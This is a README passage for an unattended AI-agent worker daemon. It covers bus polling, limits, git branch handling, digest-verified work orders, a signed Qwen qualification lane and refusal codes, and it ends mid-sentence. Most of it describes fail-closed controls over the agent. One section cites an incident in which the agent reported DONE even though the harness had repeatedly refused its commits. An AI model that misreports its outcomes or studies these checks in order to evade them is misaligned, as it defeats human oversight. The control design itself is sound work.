# Vinci Worker — Stage 1

Standalone Node program that polls an HTTP bus for work handoffs, spawns unattended `vinci -p` runs, monitors limits (runtime, budget, deadline), and publishes results back to the bus.

The daemon processes one handoff at a time and blocks until that task reaches a terminal state.

## Setup

```bash
vinci worker start --id <worker-id> \
  --server http://bus.example.com:8000 \
  [--once] [--poll-seconds 60] [--state-dir ~/.vinci-worker-state] \
  [--governor http://governor:8100] [--require-governor] \
  [--clean-room] [--disk-floor-mb 2048] [--keep-attempts 3]
```

**Required:**
- `--id`: Worker identity (e.g., "stage0-box1")
- `--server`: Bus server URL (vinci-gpu-control)
- `VINCI_BUS_TOKEN` env: Bearer token for bus auth

**Optional:**
- `--once`: Process one handoff and exit (useful for testing)
- `--poll-seconds`: Poll interval (default 60)
- `--state-dir`: Persistent state directory (default `.vinci-worker-state`)
- `--governor`: Governor URL (Stage 2). Once set, every task needs a granted lease — see "Governor Lease (fail-closed)"
- `--require-governor` (or `VINCI_WORKER_REQUIRE_GOVERNOR=1`): refuse to start (exit 78) unless `--governor` is configured
- `VINCI_WORKER_ALLOWED_PROVIDERS`: comma-separated provider allowlist enforced before clone or spawn (default `openrouter`). Invalid or empty configuration refuses startup; a disallowed task is `BLOCKED` with `provider_not_allowed`
- `--clean-room` (or `VINCI_WORKER_CLEAN_ROOM=1`): a fresh worktree, an allowlisted environment and no push for every attempt — see "Clean room". **Off by default this wave**; it flips on after the chaos gate
- `--disk-floor-mb` (or `VINCI_WORKER_DISK_FLOOR_MB`, default 2048), `--keep-attempts` (or `VINCI_WORKER_KEEP_ATTEMPTS`, default 3): clean-room bounds, ignored without `--clean-room`
- `VINCI_WORKER_MODEL_CLASSES` env: the model-class table for digest-form handoffs (inline JSON or `@<file>`), validated once at startup — invalid ⇒ exit 78; unset ⇒ prose-only. See "Model classes (runtime config)"
- `VINCI_WORKER_REGISTRY_TIMEOUT_MS` env: one deadline for the registry fetch, headers and body (default 10000)

## Supervision

The daemon is **systemd-managed**. Do NOT run with `--daemon`; let systemd handle that:

```ini
[Unit]
Description=Vinci Worker stage0
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=vinci-worker
ExecStart=/usr/local/bin/vinci worker start --id stage0-box1 --server http://bus:8000 --state-dir /var/lib/vinci-worker
Restart=always
RestartSec=10
Environment="VINCI_BUS_TOKEN=..."

[Install]
WantedBy=multi-user.target
```

## How It Works

1. **Poll**: GET /v1/messages (filtered to kind=="handoff", to=="worker:<id>")
2. **Parse**: Task envelope with headers (repo, evidence, provider, model, budget, timeout, deadline, ref)
3. **Claim**: POST status "claimed <id> attempt N" to bus
4. **Setup**: Clone/fetch the repo and reuse or create `worker/<task-id>` from `origin/main`
5. **Run**: Spawn `vinci -p --session-id <id> --tools read,grep,find,ls,bash,edit,write "<spec>"`
6. **Limits**:
   - `max_runtime_s`: SIGTERM then SIGKILL after 30s
   - `budget_usd`: Poll session JSONL every 15s; kill if cost exceeds budget
   - `deadline`: Check before start and each poll; kill if past
7. **Outcome**: Read task-outcome from session JSONL (DONE, DONE-UNVERIFIED, WAITING, BLOCKED) **and** every harness stop — a tool call the harness refused (`vinci-todo` no-progress latch, `vinci-loopbreak` reserved-actions refusal), serialized as an `isError` toolResult whose text is the block reason
8. **Publish**: Push branch to origin; if evidence==pr and no BLOCKER.md, adopt the open PR for the branch or create one (see [Publishing](#publishing))
9. **Report**: Post finding (COMPLETED), blocker (BLOCKED/FAILED), or status (UNVERIFIED)

### Outcome precedence (machine-observed events outrank the model's narrative)

Exit code zero alone means nothing. The final state is the first matching row:

| # | Observed | Final state | Notes |
|---|----------|-------------|-------|
| 1 | exit code != 0, or a limit tripped (`budget_usd`, `max_runtime_s`, `deadline`) | `FAILED` | a co-occurring harness stop is still recorded: `harness_stop` on the task file, and `harness_stops=<N> harness_stop_reason=<first stop text>` in the blocker post |
| 2 | any harness stop in the session JSONL (an `isError` toolResult with `details.vinciBlocked: true`; the `HARNESS_STOP_PATTERNS` substrings in `session-read.mjs` are the fallback for sessions without the marker) | `BLOCKED` | wins even when the outcome entry says DONE and a PR was created; `harness_stop: {count, reason}` is written to the task file and the blocker post says `stop=instrument` with the stop reason |
| 3 | outcome `BLOCKED` / `WAITING`, or a non-empty `BLOCKER.md` at HEAD | `BLOCKED` | |
| 4 | outcome `DONE_UNVERIFIED` | `UNVERIFIED` | |
| 5 | outcome `DONE` **and** a PR exists | `COMPLETED` | the only route to COMPLETED |
| 6 | anything else (outcome `DONE` without a PR, `evidence: none`, no outcome entry) | `UNVERIFIED` | produced, unassessed |

Why: issues #5 and #6 — the harness refused the agent's required work mid-run (`git commit` refused six times; the no-progress latch told a non-existent user to send the next instruction) and the session still exited 0 with a DONE outcome. The stop the harness recorded is the fact; the outcome entry is the model's story about itself.

## Task Envelope

Handoff message body (line-oriented headers, blank line, then spec):

```
repo: org/repo
evidence: pr|none                  (default: pr; `none` skips PR creation — the task then ends UNVERIFIED, never COMPLETED)
provider: openrouter|...           (default: openrouter)
model: z-ai/glm-5.2               (default)
budget_usd: 5.0                    (default)
max_runtime_s: 14400               (default; 4 hours)
deadline: 2026-08-26T12:00:00Z    (optional ISO-8601 UTC)
ref: ledger_id                     (optional; for finding refs)
branch: worker/msg_abc123          (optional; continue an EXISTING branch on origin — see Branch continuation)
base_ref: main                     (optional; the PR base the publisher targets — default main; plain branch name, same rules as branch)

<blank line>

<free-text specification passed verbatim to vinci -p>
```

Unknown headers → blocker posted, task not run.

### Branch continuation (`branch:` header)

Without `branch:` the daemon works on `worker/<taskId>` off `origin/main`. With `branch:` the
envelope pins an existing branch (e.g. the head of a held PR). Order of operations, fixed:
validate the name → ask origin live (`git ls-remote --exit-code --heads origin refs/heads/<branch>`)
**before any fetch or clone** → `git fetch origin +refs/heads/<branch>:refs/remotes/origin/<branch>`
(explicit refspec; the branch path never runs a general `git fetch origin` first) → resolve the tip
from the local `origin/<branch>` → ancestry check → `checkout -B`. Exactly three outcomes, each with
its own reason so the ledger and the operator attribution follow it:

| State on origin / locally | Result | Reason text |
|---|---|---|
| (a) branch absent on origin (live `ls-remote`, never a cached `refs/remotes/*`) | **BLOCKED before spawn**, cost 0, no session, **no fetch/clone performed** — regardless of any local branch of that name | `envelope branch <branch> not found on origin`; a stale local branch is renamed aside to `stale/<branch>-<UTC stamp>-<6 hex>` (never deleted) and the reason appends `(stale local branch <branch> at <sha> renamed aside to stale/…)` |
| (b) branch on origin; local branch absent, or an ancestor of the remote tip | checkout at the remote tip (a fast-forward when the local branch existed) | — |
| (c) branch on origin; local branch has commits not on the remote tip | **refused**, local commits untouched | `local branch <branch> at <localSha> has commits not on origin/<branch> at <remoteTip>; refusing to reset (divergence)` |

**Never-pushed residue on path (c).** Soak cohort 2 rows 11/11b (2026-08-28) were a genuine
divergence: a Night-1 local `worker/<id>` (2 ahead / 82 behind origin's rebuilt PR head) that had
never been pushed. When ALL of the following hold, the local branch is renamed aside to
`stale/<branch>-<stamp>-<hex>` (never deleted) and the attempt is **still refused**, with the reason
extended by `; never-pushed residue renamed aside to stale/… — retry continues at origin/<branch>`,
so the next attempt proceeds at the remote tip:

1. the local branch does not track `origin/<branch>` (`branch.<b>.remote`/`.merge` are not
   `origin`/`refs/heads/<b>` — a pushed branch carries that upstream; the daemon's own default path
   leaves the upstream at `origin/main`, which is not evidence of a push);
2. after `git fetch --prune origin '+refs/heads/*:refs/remotes/origin/*'` (ALL origin heads by
   explicit refspec — a `--single-branch` cache would otherwise never see a head outside its
   refspec and misclassify work pushed there), no origin head contains the local tip
   (`git for-each-ref --contains=<localSha> refs/remotes/origin` is empty); if the branch has ANY
   configured upstream whose remote-tracking ref is still unresolvable after that fetch, the
   attempt is refused without a rename and the reason appends
   `; upstream <remote>/<merge> of <branch> is not resolvable on origin; not treating it as never-pushed`;
3. every commit in `<remoteTip>..<localSha>` is unreachable from every origin head
   (`git rev-list --count <remoteTip>..<localSha> --not --remotes=origin` equals the range count).

A branch that tracks `origin/<branch>`, or whose commits live on any other origin head, is refused
and left exactly where it is. Any error in these checks ⇒ no rename, plain refusal.

Origin unreachable is reported as `git ls-remote origin failed for <branch>: …`, never as
not-found or divergence. A branch that exists on origin but cannot be resolved locally after the
explicit fetch is `envelope branch <branch> exists on origin but fetch did not materialize
origin/<branch> locally`. Before any `reset --hard`/`clean -fd`, the shared checkout quarantine
publishes a content-addressed immutable generation and a canonical receipt (Wave 1 clean-room
item). The task record carries that receipt when a capture occurred.

Debris capture has no ordinary self-bootstrap path. Deployment must create the private
`<state>/debris/` and `<state>/debris/.task-identities-v1/` directories, build the exact closed
`vinci.worker-debris-root-identity/1` document for those directory identities, and expose that
read-only document at an absolute path outside the replaceable worker state through
`VINCI_WORKER_DEBRIS_ROOT_ANCHOR`. The anchor must assert `authority_admitted: true` and bind a
64-hex deployment lineage id, state/root paths, and both directory identities. A missing,
writable, in-state, replaced, or rolled-back anchor refuses capture before source cleanup; the
worker never creates or repairs it. Deployment must also supply the SHA-256 of the exact canonical
anchor bytes through `VINCI_WORKER_DEBRIS_ROOT_ANCHOR_SHA256`; ordinary capture cannot change that
process-pinned trust root.

Every task lineage and complete generation/attempt/current inventory is also serialized through a
deployment-owned compare-and-set service. `VINCI_WORKER_DEBRIS_AUTHORITY_ADAPTER` names the
reviewed bridge artifact whose identity the service admission binds; the worker pins its exact
bytes with `VINCI_WORKER_DEBRIS_AUTHORITY_ADAPTER_SHA256` but does not execute it. Deployment supplies
an already-open socket descriptor. The worker proves that the descriptor is a socket and pins its
exact observed metadata, including the platform-specific link count. The signed service admission,
not a kernel-specific `st_nlink` value, proves that it is the supervisor-preopened unnamed endpoint
with the required peer, inheritance, and exfiltration controls. The worker communicates directly
over that process-private descriptor; it never opens an authority pathname and never exports the
descriptor to a repository command or task child. There is no reusable bearer in environment,
argv, or a reopenable capability file. Every service response is a canonical Ed25519-signed envelope that
binds a fresh worker nonce, exact request digest, socket identity, adapter and service implementation
digests, root/lineage, authority epoch, service principal, peer-credential enforcement, isolated
service storage, non-inheritance by task children, and the deployment's parent-FD-exfiltration
proof. Missing, non-socket, unsigned, replayed, relabelled, or incompletely admitted channels
refuse. Service responses are bounded canonical bytes, and each head binds the root anchor,
lineage, storage identities, monotonic
sequence/predecessor, index, generations, attempts, and current receipt. The authority service
must independently reject inventory shrink, predecessor/sequence forks, root/storage changes,
and any CAS not made through the admitted capability. Deployment must explicitly create the private task
directories and task-identity anchor and reserve their empty sequence-zero head in that adapter
before the task may capture debris. Ordinary worker capture never provisions a lineage: a missing
head refuses before it creates or cleans task state. Missing or rolled-back adapter state for an
existing task, any local deletion/fork, or a second task-root bootstrap refuses before cleanup. A verified
unindexed local suffix may advance the external head after a crash; an external head never moves
backward. Each request has one cancellable end-to-end deadline. Timeout, partial output, trailing
bytes, malformed authentication, or unsolicited/stale output permanently invalidates that stream;
the worker preserves source and requires a fresh supervisor-provided channel before reconciliation.
The bridge artifact, socket descriptor metadata, trust key, and all anchor settings are removed from the
repository task's environment; task processes inherit neither the authority socket nor an
authority endpoint.

## Handoff Forms (Wave 1B)

A handoff body is one of two forms. The daemon detects which by its first non-blank
character — a leading `{` is a **digest triple**, anything else is **legacy prose**:

- **Prose** (the classic envelope above): starts with a header line such as `repo: org/repo`;
  no leading `{`. Parsed by `parseEnvelope`. Carries the branch/evidence/limits inline, so it
  can pin `branch:` but cannot pin an immutable `base_commit`. Its behaviour, posts and bytes are
  unchanged by Wave 1B (the existing suite is the oracle).
- **Digest triple**: a JSON object whose first non-blank character is `{`, with EXACTLY three
  keys — `work_order_id`, `contract_digest`, `execution_spec_digest`. Any extra or missing key
  is a malformed handoff (`malformed_handoff`), not an extension point. It names a pinned
  work order by digest; every runtime term (repo, model class, `baseRef`/`baseCommit`,
  `targetBranch`, bounds, tools, output, promotion) is fetched from the Governor's pinned
  registry (`GET <server>/v1/governor/contracts/{work_order_id}`), VALIDATED, and recomputed
  locally.

The digest form **never spawns a model on any mismatch** — every refusal below happens before a
clone and before a vinci spawn, with ZERO git transfer (no fetch/clone/ls-remote/push).

### Registry fetch

The registry answer is streamed with a hard cap of 256 KiB under ONE deadline
(`VINCI_WORKER_REGISTRY_TIMEOUT_MS`, default 10000) that covers headers AND body; `Content-Length`
is never trusted. The registry is a PINNED endpoint on the configured server: the fetch sets
`redirect: "error"`, so a `3xx` is a refusal and never a hop that would carry the bus token to a
host nobody named. A stalled/trickling body, an oversized (chunked or not) body, a redirect, a
connection error or a timeout are all `registry_unavailable`; the reason names what actually
happened (`timed out after <n> ms` ONLY for the deadline, the connection error's code otherwise
— see WARN-1 in the W1B review, where operator precedence made every connection failure read as
a timeout). `401`/`403` is `registry_forbidden` (the bus
token is not allowed to read contracts — an operator problem, distinct from a missing order),
`404` is `work_order_not_found`, any other non-2xx is `registry_error`, and a body that is not
JSON is `registry_malformed`.

### Validation before hashing

`vinci/worker/contracts/digest.mjs` vendors the upstream validators (vinci-contracts @ b2e0188b:
`validateWorkOrder`, schema v3; `validateExecutionSpec`, schema v1) and the digest functions hash
ONLY a record that passes them — exactly as upstream ("a digest of an invalid record is not
computed"). Every required top-level key, the nested required keys the worker consumes
(`repository.{host,owner,name}`, `resourceBounds.{budgetMicrousd,maxRuntimeS,deadline}`,
`evidence.required`, `acceptanceCriteria[].{id,statement,verifiedBy}`, actors, …), the pinned
`schemaVersion`/`contractVersion` rules and the unknown-key rule (top level AND nested) are
enforced. A served record that reproduces the handed digest byte for byte but fails validation
is refused as `invalid_work_order` / `invalid_execution_spec` naming the first `<path> <code>`.
The golden vectors under `vinci/test/fixtures/contract-vectors/` pin both the canonical bytes
and the validators.

`grantedAuthority` is not opaque text. The `path:` grant grammar
(`vinci/worker/contracts/path-grant.mjs`, vendored from vinci-contracts @ 9e9a105) is applied to
every grant: a `path:` token that is empty, absolute, `.` (root scope), or carries a `.`/`..`/
empty segment, a backslash, a NUL, or more than 1024 characters makes the ORDER invalid
(`invalid_work_order`, `/grantedAuthority/<i> path_grant_<reason>`). The grammar never
normalises. Grants with any other prefix — including prose like `edit files under src/api` — are
untouched. The shared cases file `path-grant-cases.json` is copied byte for byte from upstream
and read by `worker-contract-vectors.mjs`, so the two implementations cannot drift.

An execution spec carrying the newer optional `paths` field (a run's enumerated write scope) is
still refused as `/paths unknown_field`. That is DELIBERATE and fail-closed: the worker has no
way to confine writes to a scope, and ignoring the field would run with root write scope while
the contract said otherwise. `worker-within-order.mjs` pins the refusal so it cannot change by
accident.

### Containment: a spec may ask for no more than its order grants

Binding proves WHICH order a spec was compiled from. That is identity, not containment — a spec
bound to the right order can still name a repository, a branch, a promotion, a tool or a deadline
the order never granted. `vinci/worker/contracts/within-order.mjs` vendors the upstream
comparison (`checkValidatedExecutionSpecWithinOrder`) and runs it immediately after the binding
check, before ANY materialization, refusing with `execution_exceeds_contract` and naming every
dimension exceeded. It is PURE: two records in, a verdict out, no I/O.

Positive-list semantics: absence is not permission. Grants are matched by exact token grammar —
`tool:<name>`, `repo:<host>/<owner>/<name>`, `branch:<name>`, `branch:<prefix>/*` (one trailing
wildcard, non-empty prefix), `promotion:pull_request`. Everything else is prose for humans and
covers nothing. `resourceBounds.deadline` may not be later than the order's `expiresAt`. A
`branch:*` (or `branch:/*`) grant is an ERROR on the order side (`grant_wildcard_unbounded`), not
a grant that quietly covers everything.

The spec-side `path_not_granted` half of the upstream check is NOT vendored, because the worker
refuses `paths` outright (above). Port it together with write-scope enforcement.

### Model classes (runtime config)

The class → (provider, model) table is OPERATOR RUNTIME CONFIG, read from
`VINCI_WORKER_MODEL_CLASSES` — inline JSON, or `@<path>` naming a JSON file of the same shape:

```
VINCI_WORKER_MODEL_CLASSES='{"forte":{"provider":"vinci","model":"forte"},"fortissimo":{"provider":"vinci","model":"fortissimo"}}'
VINCI_WORKER_MODEL_CLASSES=@/etc/vinci-worker/model-classes.json
```

It is parsed and validated ONCE at daemon startup, before the state dir, the daemon lock, the
`/v1/version` fetch and the online post. Invalid (bad JSON, unreadable file, a class without
`{ provider, model }`, an empty object) ⇒ the daemon **refuses to start with exit 78** and the
reason on stderr; a change needs a restart. **Unset ⇒ the daemon starts prose-only**: every
digest handoff BLOCKs with `unknown_model_class: MODEL_CLASSES not configured`. The table is
closed: a `modelClass` it does not name is `unknown_model_class`, never passed through as a model
id (`auto` is deliberately never a class — a contract names a class, not "whatever the account
resolves to"). A spec-level `provider` pin must EQUAL the configured provider for the class
(`provider_mismatch` otherwise); it never overrides it.

### Qualified direct Qwen H200 lane

`qwen-h200` is an internal OpenAI-compatible provider for the exact model
`Qwen/Qwen3.8-27B`. It is not an inference service and never manages a GPU: the operator supplies
Ayush's already-running endpoint. A digest-form class entry is:

```
{"qwen-38-27b":{"provider":"qwen-h200","model":"Qwen/Qwen3.8-27B"}}
```

Enable it only in the Worker process that should admit the lane by including `qwen-h200` in
`VINCI_WORKER_ALLOWED_PROVIDERS` and the entry above in `VINCI_WORKER_MODEL_CLASSES`. Qwen is
digest-WorkOrder-only; legacy prose handoffs are refused because they cannot carry the validated
acceptance criteria and immutable contract binding required by this lane.

The lane is fail-closed. Runtime registration requires all of the following:

- `VINCI_QWEN_BASE_URL`: the operator HTTPS endpoint. Credentials, query strings, fragments,
  redirects, IPv6, and private/local/reserved DNS answers are refused; loopback HTTP exists only for
  tests. Every connection uses the public IPv4 addresses resolved and pinned during readiness.
- `VINCI_QWEN_SECRET_REF=file:/absolute/private/path`: the worker opens a private, regular,
  non-symlinked credential file and passes only inherited descriptor 3 to the child. The reference
  is removed before spawn, the child consumes and closes the descriptor during provider bootstrap,
  and neither the secret nor its reference is put in general child environment, argv, logs, or a
  generated file. The WorkOrder prompt is sent on stdin, never argv.
- `VINCI_QWEN_QUALIFICATION_FILE` plus its exact `VINCI_QWEN_QUALIFICATION_SHA256`, and an
  independently controlled Ed25519 trust key plus `VINCI_QWEN_QUALIFICATION_PUBLIC_KEY_SHA256` and
  `VINCI_QWEN_QUALIFICATION_ISSUER`. Qualification bytes and key bytes must be non-writable regular
  files. An unsigned or self-admitted record is invalid.
- a deterministic Governor lease and worker-derived WorkOrder, Run, and Attempt identities. Model
  output supplies none of them. Each Worker attempt has its own session; every bounded transport
  retry is recorded beneath that Attempt with a distinct idempotency key.

The signed v2 envelope has a maximum seven-day lifetime, cites a canary no more than 24 hours old,
and binds the independent review message/body digest and burn-in report digest. Its closed payload
binds the endpoint and served-identity digests; exact model and immutable revision; runtime
engine/version/artifact/launch-arguments tuple; exact WorkOrder prompt; full assembled system
prompt; ordered tool names, complete tool schemas, and governed tool policy; client and extension
builds; outbound encoding; SSE/tool-call/usage capabilities; total deadline, retry and retry-delay
caps; request/success/error body byte bounds; context/output limits; concurrency ceiling; and USD
pricing basis/rates. Any missing, extra, stale, mismatched, or unverified field refuses registration.

Authenticated `/health` and `/v1/models` must succeed while anonymous requests to both are refused.
The models response and every successful inference response must repeat the exact model, revision,
endpoint identity, and runtime tuple. The chat transport calls only the qualified URL, refuses
redirects, keeps one total deadline across headers/body/retries, bounds error and successful SSE
bodies, requires strict OpenAI chunk object/model/usage identities and `[DONE]`, and disables SDK
retries. Real HTTP 500s and transport/protocol failures count toward an atomically persisted circuit;
three failures open it for 60 seconds by default. `VINCI_QWEN_CIRCUIT_THRESHOLD` and
`VINCI_QWEN_CIRCUIT_OPEN_MS` are bounded operator overrides.

Concurrency defaults to 1. The signed schema understands only the ladder
`1 → 2 → 4 → 8 → 16 → 24 → 32`, never an intermediate value, and never above Ayush's advertised
ceiling. Any stage above 1 must cite the immediately prior stage with at least 168 continuous hours
and 1,000 WorkOrders, 100% acceptance pass and usage coverage, at most 0.5% transport errors, and
zero identity failures, verification failures, circuit opens, resource alarms, or Governor stops.
Promotion is a new independent review and signature; it is never automatic. Today the runtime has
only its single-process permit, so every signed value above 1 still fails closed with
`fleet_permit_authority_missing`. A future fleet authority must issue bounded, expiring, fenced
permits keyed by WorkOrder/Run/Attempt, enforce the signed and advertised ceilings atomically across
workers, and define a bounded queue before any stage above 1 can run.

Qwen output gets a `vinci-qwen-output-label` session record marking it non-authoritative and
requiring independent checking. It is never permission, a Governor ruling, merge authorization,
spend/credential approval, or release authority. Existing deterministic leases, harness stops,
verification, review, and no-merge boundaries remain authoritative. There is no automatic provider
switching. OpenRouter fallback means a new, separately authorized attempt whose envelope explicitly
selects `openrouter` and whose operator allowlist permits it.

Post-launch canary (readiness/auth GETs plus one bounded inference request; no deployment, GPU,
credential, or remote-state mutation):

```
VINCI_QWEN_BASE_URL=https://operator-endpoint.example \
VINCI_QWEN_SECRET_REF=file:/run/secrets/vinci-qwen-token \
node --experimental-strip-types vinci/extensions/lib/qwen-runtime.ts --canary
```

The canary requests one streaming `report_ready` tool call, requires exact arguments
`{ "status": "ready" }` plus strict usage, and prints a non-authoritative JSON report. It cannot
write or admit qualification.

After reviewing the canary and numeric burn-in report, generate an **unsigned request** for the
never-builder reviewer. The command prints JSON only. The full system-prompt, tool-schema, canary,
burn-in, and WorkOrder-prompt files must be operator-owned and non-writable:

```
VINCI_QWEN_BASE_URL=https://operator-endpoint.example \
VINCI_QWEN_QUALIFICATION_PROMPT_FILE=/absolute/work-order-prompt.txt \
VINCI_QWEN_QUALIFICATION_SYSTEM_PROMPT_FILE=/absolute/full-system-prompt.txt \
VINCI_QWEN_QUALIFICATION_TOOL_SCHEMAS_FILE=/absolute/ordered-tool-schemas.json \
VINCI_QWEN_QUALIFICATION_TOOLS='["read","grep","find","ls","bash","edit","write"]' \
VINCI_QWEN_CANARY_REPORT_FILE=/absolute/canary-v2.json \
VINCI_QWEN_BURN_IN_REPORT_FILE=/absolute/burn-in-v1.json \
VINCI_QWEN_SERVED_REVISION=<40-or-64-hex> \
VINCI_QWEN_RUNTIME_ENGINE=vllm \
VINCI_QWEN_RUNTIME_VERSION=<exact-version> \
VINCI_QWEN_RUNTIME_ARTIFACT_SHA256=<64hex> \
VINCI_QWEN_RUNTIME_ARGUMENTS_SHA256=<64hex> \
VINCI_QWEN_ENDPOINT_IDENTITY_SHA256=<64hex> \
VINCI_QWEN_CLIENT_BUILD_SHA256=<64hex> \
VINCI_QWEN_EXTENSION_BUILD_SHA256=<64hex> \
VINCI_QWEN_ADVERTISED_MAX_CONCURRENCY=<1..32> \
VINCI_QWEN_CONTEXT_WINDOW=<tokens> VINCI_QWEN_MAX_TOKENS=<tokens> \
VINCI_QWEN_PRICE_BASIS=<documented-estimate-basis> \
VINCI_QWEN_INPUT_PER_MILLION_USD=<estimate> \
VINCI_QWEN_OUTPUT_PER_MILLION_USD=<estimate> \
VINCI_QWEN_CACHE_READ_PER_MILLION_USD=<estimate> \
VINCI_QWEN_CACHE_WRITE_PER_MILLION_USD=<estimate> \
node --experimental-strip-types vinci/extensions/lib/qwen-runtime.ts --qualification-request
```

The independent reviewer verifies the evidence, adds issuer/timestamps/review provenance, and signs
the canonical qualification with the separately controlled key. The Qwen builder/operator must not
possess that signing key. Requalification is mandatory after a failed/expired canary or any change
to capabilities/limits, client build, endpoint identity/address policy, model/revision, outbound
encoding, pricing basis, runtime artifact/arguments, system prompt, or tool schema/policy.

Per-attempt telemetry remains in the existing economics summary: `work_order_id`, `session_id`
(Run), `attempt_label`, `started_at`/`finished_at` (wall latency), terminal `local_result`, and the
per-provider/model roll-up of calls, input/cache/output/reasoning tokens and estimated micro-USD.
The route is `single-provider-no-automatic-fallback` and names Qwen when inference occurred.

Stop admission and drain in-flight work on any identity/auth/signature mismatch, failed canary,
acceptance or verification failure, missing/malformed usage, circuit open, resource alarm, Governor
stop/denial, or a transport error rate above 0.5%. Do not skip a ladder stage and do not resume a
stopped stage: `safe_resume` is always `false`; recovery requires fresh canary/burn-in evidence and a
new independent qualification. Hundreds of millions of available tokens are capacity, not an
acceptance signal. There is no automatic fallback: OpenRouter is a new, explicitly authorized
attempt with its own envelope, lease, Run, Attempt, session, and accounting.

### Base checkout (`baseRef` / `baseCommit`)

The task branch (`targetBranch`) is created FROM the pinned `baseCommit`, never continued from
an origin head. `baseRef` is REQUIRED (plain-branch rule, like `targetBranch`). Order of
operations, fixed:

1. names validated (`git check-ref-format --branch` for both);
2. uncached ⇒ `git clone`; cached ⇒ the shared-tree quarantine runs FIRST. Tracked/untracked
   leavings are copied and revalidated under
   `<state>/debris/<task>/ledger-v1/generations/<content-digest>/`, with canonical
   manifest/receipt/commit-marker bytes, file and directory fsync, and an atomically replaced
   index/current pointer. Every committed generation is independently enumerated and must form
   an exact bijection with the closed, unique, ordered index; an `INDEXED` marker is written only
   after the index is durable, distinguishing recoverable pre-index crashes from index rollback.
   Generation identity binds the capture attempt as well as the source bytes: an exact retry of
   the same unfinished attempt converges on the same generation, while a later independent
   attempt with byte-identical debris receives a distinct generation. Publication is exclusive.
   Each request has an immutable attempt receipt under
   `ledger-v1/attempts/<attempt>.json`, so the requested retry and original capturing attempt are
   both explicit. The derived `current.json` pointer and missing attempt receipts are rebuilt only
   from the complete verified generation/index bijection; a single attempt can never bind two
   source identities. Divergent retries retain distinct immutable generations;
3. `git fetch origin +refs/heads/<baseRef>:refs/remotes/origin/<baseRef>` MUST succeed, else
   **BLOCKED `base_ref_unavailable`**;
4. `git merge-base --is-ancestor <baseCommit> refs/remotes/origin/<baseRef>` must hold, else
   **BLOCKED `base_commit_unreachable`** — there is NO fallback to local objects: a commit the
   cache happens to hold (an earlier local-only commit, say) is not a base origin vouches for;
4b. **The pinned `targetBranch` has already moved.** `git ls-remote origin
   refs/heads/<targetBranch>`: if origin has that branch, it is not sitting at `baseCommit`, and
   it DESCENDS from `baseCommit`, the run is **BLOCKED `target_branch_ahead_of_base`** — before
   the spawn, and on a cold box as well as a warm one.

   That condition is a fact about refs and the refusal says only that. It is **not** proof of
   authorship: the commonest cause is this spec's own earlier run, but a human — or a different
   spec pinning the same base — pushing to that branch name produces the identical ref topology,
   and the worker cannot tell them apart (it authors no commits itself, so there is no trailer or
   footer of its own to read back). The reason enumerates both readings rather than asserting
   one. Either way the repair is the same, and the refusal is right in both: that push would have
   failed anyway, and refusing here costs no model spend.

   Previously only a warm box noticed at all, and called it `branch_diverged` — false, because
   the commits it refused to reset may be this contract's own output; on a cold box nothing
   refused and the model was spawned and paid for before the push failed. The first version of
   this check then over-corrected and called it `already_published`, which claimed an identity
   nothing had checked;
5. an existing local `targetBranch` goes through the branch-continuation rules above
   (PR #22): an ancestor of `baseCommit` is simply reset; never-pushed residue (no upstream, on
   no origin head) is renamed aside to `stale/<branch>-<stamp>-<hex>` (never deleted) and the
   task continues from `baseCommit`; a branch that tracks `origin/<targetBranch>` or whose
   commits live on another origin head is **BLOCKED `branch_diverged`** and left in place;
6. only then `git checkout -B <targetBranch> <baseCommit>`.

`baseRef`/`baseCommit` then thread through the whole run: the PR (when opened) is
`gh pr create --base <baseRef>`, the evidence `git.diff` is `<baseCommit>...HEAD`, the patch
output is `format-patch <baseCommit>..HEAD`. Nothing on the digest path is hardcoded to `main`.

### Output modes and promotion

`output` (ExecutionSpec) decides what `publish` does; a pull request is PROMOTION, never evidence:

| output | push | evidence bundle carries | PR |
|---|---|---|---|
| `none` | never | session, git.diff, result.json, runner.log | never |
| `patch` | never | + `<attempt>.patch` (`git format-patch --stdout <baseCommit>..HEAD`) | never |
| `artifact` | never | + `artifacts.json` (`{ base_commit, files }`: exact canonical UTF-8 repo-relative identities from raw NUL-delimited Git output; unsupported/duplicate/alias paths refuse; also `artifacts` on the task record) | never |
| `branch` | `refs/heads/<targetBranch>` | as `none` | only when `promotion: pull_request` (`--base <baseRef>`) |

The record's `publish` is `none` / `patch` / `artifact` / `pushed` / `push_failed` (or `blocked`
when a `BLOCKER.md` at HEAD suppressed the PR; the blocker is `blocker_reason` on every mode).

### Refusal reasons

The digest form BLOCKs with one of these machine-readable `.code`s, in check order:

| code | meaning |
|------|---------|
| `malformed_handoff` | body starts with `{` but is not a valid 3-key JSON triple (extra/missing key, bad JSON, bad digest/identifier) |
| `registry_unavailable` / `registry_forbidden` / `work_order_not_found` / `registry_error` / `registry_malformed` | the registry fetch (see above) |
| `invalid_work_order` | the served work order fails the vendored schema-v3 validator (missing/unknown key, wrong schemaVersion/contractVersion, …); it is never hashed |
| `contract_digest_mismatch` | the (validated) served work order does not reproduce `contract_digest` |
| `invalid_execution_spec` | no served spec matched and at least one fails the vendored schema-v1 validator |
| `execution_spec_digest_mismatch` | no (validated) served spec reproduces `execution_spec_digest` |
| `binding_mismatch` | the matched spec was compiled from a different work order id/digest |
| `execution_exceeds_contract` | the bound spec asks for MORE than the order grants: `tool_not_granted`, `repository_not_granted`, `branch_not_granted`, `promotion_not_granted`, `deadline_exceeds_contract`, or `grant_wildcard_unbounded` on the order — every failing dimension is named |
| `unsupported_repository_host` | spec repository host is not `github.com` |
| `unknown_model_class` | `modelClass` not in the runtime table, or the table is not configured |
| `provider_mismatch` | the spec's `provider` pin differs from the configured provider for its class |
| `invalid_spec_field` / `no_tools` / `capability_unsupported` | a materialized field the worker cannot serve (empty tools; any `requiredCapabilities` — the worker advertises none) |
| `invalid_bounds` | `budget_usd <= 0`, `max_runtime_s <= 0`, or a deadline already in the past — before ANY git call; the reason NAMES the field that tripped and its value |
| `base_ref_unavailable` / `base_commit_unreachable` / `target_branch_ahead_of_base` / `branch_diverged` | the base checkout (see above) |

A successful digest handoff stamps the task record with `work_order_id`, `contract_digest`
(long form), `execution_spec_digest`, `base_commit`, `base_ref`, `promotion`, `output`,
`model_class`, `tools`, `input_artifacts`, `required_capabilities`. EVERY terminal post of a
digest-form task — the final state AND every early blocker (refusal, invalid bounds, Governor
refusal/unavailability, base checkout) — carries `contract=<work_order_id>@<digest8>` as its first
token (`contract=malformed` when the triple itself could not be parsed, and also when the
